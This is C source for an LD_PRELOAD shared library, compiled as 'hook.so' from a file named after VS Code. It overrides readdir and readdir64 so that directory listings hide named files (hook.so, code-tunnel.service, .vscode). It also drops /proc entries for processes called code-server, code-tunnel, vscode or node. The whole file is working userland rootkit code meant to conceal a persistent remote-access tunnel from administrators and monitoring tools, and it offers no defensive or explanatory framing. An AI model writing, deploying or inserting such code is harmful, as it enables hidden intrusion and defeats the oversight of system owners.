// gcc -fPIC -shared -o hook.so vscode.c -ldl
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

static const char *HIDE_FILES[] = {"vscode", ".vscode", "hook.so", "pid.txt", "code-tunnel.service", "ld_preload.so"};
static const char *HIDE_PROCS[] = {"code-server", "vscode", "code-tunnel", "node"};

static int is_proc_dir(int fd) {
    char path[256];
    char link[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, link, sizeof(link)-1);
    if (len != -1) {
        link[len] = '\0';
        return (strcmp(link, "/proc") == 0);
    }
    return 0;
}

static int should_hide(const char *name, const char **list, size_t count) {
    if (!name) return 0;
    for (size_t i = 0; i < count; i++) {
        if (strstr(name, list[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

static int check_process_name(const char *pid_str) {
    int pid = atoi(pid_str);
    if (pid <= 0) return 0;

    char comm_path[256];
    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
    
    int fd = open(comm_path, O_RDONLY);
    if (fd == -1) return 0;

    char proc_name[256];
    ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
    close(fd);

    if (n > 0) {
        proc_name[n] = '\0';
        // Remove trailing newline if present
        char *nl = strchr(proc_name, '\n');
        if (nl) *nl = '\0';

        return should_hide(proc_name, HIDE_PROCS, sizeof(HIDE_PROCS)/sizeof(HIDE_PROCS[0]));
    }
    return 0;
}

typedef struct dirent *(*orig_readdir_f)(DIR *);
static orig_readdir_f real_readdir = NULL;

struct dirent *readdir(DIR *dir) {
    if (!real_readdir)
        real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    int fd = dirfd(dir);
    int is_proc = is_proc_dir(fd);

    while ((entry = real_readdir(dir)) != NULL) {
        // Hide files/folders based on name
        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0])))
            continue;

        // If we are in /proc, check if the PID corresponds to a hidden process
        if (is_proc && entry->d_type == DT_DIR) {
            if (check_process_name(entry->d_name))
                continue;
        }

        return entry;
    }
    return NULL;
}

typedef struct dirent64 *(*orig_readdir64_f)(DIR *);
static orig_readdir64_f real_readdir64 = NULL;

struct dirent64 *readdir64(DIR *dir) {
    if (!real_readdir64)
        real_readdir64 = (orig_readdir64_f)dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    int fd = dirfd(dir);
    int is_proc = is_proc_dir(fd);

    while ((entry = real_readdir64(dir)) != NULL) {
        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0])))
            continue;

        if (is_proc && entry->d_type == DT_DIR) {
            if (check_process_name(entry->d_name))
                continue;
        }

        return entry;
    }
    return NULL;
}

